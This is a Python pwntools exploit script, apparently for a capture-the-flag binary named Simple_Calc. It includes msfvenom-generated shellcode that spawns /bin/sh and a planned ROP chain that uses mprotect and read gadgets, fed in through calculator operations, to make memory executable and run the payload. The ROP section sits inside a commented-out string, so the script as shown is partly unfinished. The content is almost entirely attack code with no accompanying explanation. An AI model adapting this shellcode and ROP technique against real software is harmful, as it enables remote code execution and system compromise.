from pwn import *

c = process('./Simple_Calc')
gdb.attach(c, """
    b *0x401556
""")
'''
msfvenom --payload linux/x64/exec CMD='/bin/sh' --format python
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86_64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 47 bytes'''
buf =  ""
buf += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
buf += "\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x56\x57\x48\x89\xe6\x0f\x05"

''' Our ROP Chain
*addr = 0x6c1000
len = 0x1000
prot = 0x7
mprotect ((void*)0x6c1000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC);
>> 0
>> 0x6c1000
>> 0x1000
read(stdin, (void*) 0x6c1000, 0x1000);
0x6c1000
'''
def ValCalc(target, s):
    if (int(target) == 0):
        s.sendline ("2")
        s.sendline ("40")
        s.sendline ("40")
    else:
        s.sendline ("1")
        s.sendline (str(int(target)-40))
        s.sendline ("40")

raw_input("Waiting for GDB >> ")
c.send("255\n")

rdx_rsi_gadget = 0x437aa9 # pop rdx; pop rsi; ret
rdi_gadget = 0x401b73 # pop rdi; ret
mprotect = 0x435690 # int mprotect(void *addr, size_t len, int prot);
fn_read = 0x434b20 # ssize_t read(int fd, void *buf, size_t count);
data = 0x6c1000 #target

for x in range(18):
    ValCalc(0,c)

'''
# pop rdi, rsi, rdx
ValCalc(rdi_gadget, c)
ValCalc(0, c)
ValCalc(data,c)
ValCalc(0, c)
ValCalc(rdx_rsi_gadget, c)
ValCalc(0, c)
ValCalc(0x7,c)
ValCalc(0, c)
ValCalc(0x1000, c)
ValCalc(0, c)
ValCalc(mprotect, c)
ValCalc(0, c)

ValCalc(rdi_gadget, c)
ValCalc(0, c)
ValCalc(0, c) #stdin
ValCalc(0, c)
ValCalc(rdx_rsi_gadget, c)
ValCalc(0, c)
ValCalc(0x1000, c)
ValCalc(0, c)
ValCalc(data, c)
ValCalc(0, c)
ValCalc(fn_read, c)
ValCalc(0, c)

ValCalc(data, c)
ValCalc(0, c)'''


c.send("5\n")
c.sendline(buf)
# give me my shell
c.interactive()
